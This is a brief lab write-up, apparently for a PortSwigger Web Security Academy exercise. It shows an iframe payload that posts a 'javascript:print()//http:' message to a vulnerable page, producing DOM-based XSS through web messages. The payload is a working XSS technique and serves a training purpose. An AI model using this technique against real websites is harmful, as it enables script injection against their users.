# DOM XSS using web messages and a JavaScript URL

![image](https://user-images.githubusercontent.com/60841283/153745891-1abc46fc-6209-47cd-9758-d4ed7835029b.png)

Payload in exploit server (in Body section) :- 
```html
<iframe src="https://aca41fb21f22be89c08920d7000500d9.web-security-academy.net/#" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
```

![image](https://user-images.githubusercontent.com/60841283/153745846-b911ffad-70b0-4fc3-a33d-85a6b54741af.png)
